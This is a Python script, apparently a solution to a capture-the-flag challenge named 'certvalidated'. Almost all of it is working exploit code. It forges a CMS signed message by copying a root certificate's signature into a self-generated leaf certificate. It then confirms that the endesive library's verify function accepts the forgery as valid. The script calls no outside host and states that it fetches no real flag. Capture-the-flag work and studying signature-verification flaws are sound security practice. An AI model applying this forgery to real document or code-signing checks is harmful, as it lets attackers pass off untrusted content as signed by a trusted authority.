"""DUCTF 2025 certvalidated: test a CMS certificate-signature substitution.

The public root signatureValue is copied into a newly generated leaf cert
that claims the root as its issuer, even though its TBSCertificate was
never signed by the root. We sign the original challenge message using our
own generated RSA private key, and exercise the real endesive.plain.verify.
No real contest service or real flag is contacted.
"""
import argparse
import base64
import datetime
import re
from pathlib import Path


def parse_message(source: str) -> bytes:
    match = re.search(r"^TO_SIGN\s*=\s*'([^']+)'", source, re.M)
    if not match:
        raise ValueError("Original certvalidated TO_SIGN text missing")
    return match.group(1).encode("utf-8")


def create_forged_cms(challenge_text: bytes, root_pem: bytes) -> bytes:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.x509.oid import NameOID
    from asn1crypto import cms, x509 as asn1x509

    if not challenge_text or b"\x00" in challenge_text:
        raise ValueError("Invalid challenge message")
    root = x509.load_pem_x509_certificate(root_pem)
    secret_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "CTF local leaf")])
    now = datetime.datetime.now(datetime.timezone.utc)
    leaf = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(root.issuer)
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=30))
        .serial_number(x509.random_serial_number())
        .public_key(secret_key.public_key())
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, content_commitment=False,
                key_encipherment=False, data_encipherment=False,
                key_agreement=False, key_cert_sign=False, crl_sign=False,
                encipher_only=False, decipher_only=False,
            ),
            critical=True,
        )
        .sign(secret_key, hashes.SHA256())
    )
    leaf_der = leaf.public_bytes(serialization.Encoding.DER)
    replacement = leaf_der.replace(leaf.signature, root.signature)
    if replacement == leaf_der:
        raise ValueError("Unable to substitute the certificate signature")
    leaf_asn1 = asn1x509.Certificate.load(replacement)
    if not leaf_asn1["tbs_certificate"]["subject_public_key_info"]:
        raise ValueError("Malformed substituted certificate")
    sig = secret_key.sign(challenge_text, padding.PKCS1v15(), hashes.SHA256())
    signed = cms.SignedData({
        "version": "v1",
        "encap_content_info": {"content_type": "data", "content": challenge_text},
        "digest_algorithms": [
            {"algorithm": "sha256", "parameters": None},
        ],
        "certificates": [cms.CertificateChoices.load(replacement)],
        "signer_infos": [{
            "version": "v1",
            "digest_algorithm": {"algorithm": "sha256", "parameters": None},
            "signature_algorithm": {"algorithm": "sha256_rsa", "parameters": None},
            "signature": sig,
            "sid": cms.IssuerAndSerialNumber({
                "issuer": asn1x509.Name.load(leaf.issuer.public_bytes()),
                "serial_number": leaf.serial_number,
            }),
        }],
    })
    return cms.ContentInfo({"content_type": "signed_data", "content": signed}).dump()


def check_original_verifier(challenge_source: str, root_pem: bytes):
    from endesive import plain
    message = parse_message(challenge_source)
    token = create_forged_cms(message, root_pem)
    hashok, signatureok, certok = plain.verify(token, message, [root_pem])
    return token, (hashok, signatureok, certok)


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("source", type=Path)
    p.add_argument("root", type=Path)
    args = p.parse_args()
    blob, statuses = check_original_verifier(
        args.source.read_text(encoding="utf-8"), args.root.read_bytes())
    print("Original endesive verification:", statuses)
    if not all(statuses):
        raise SystemExit("CMS verifier bypass was not confirmed")
    print("CMS blob base64:", base64.b64encode(blob).decode("ascii"))
    print("Local verification completed; remote challenge flag was NOT fetched.")


if __name__ == "__main__":
    main()
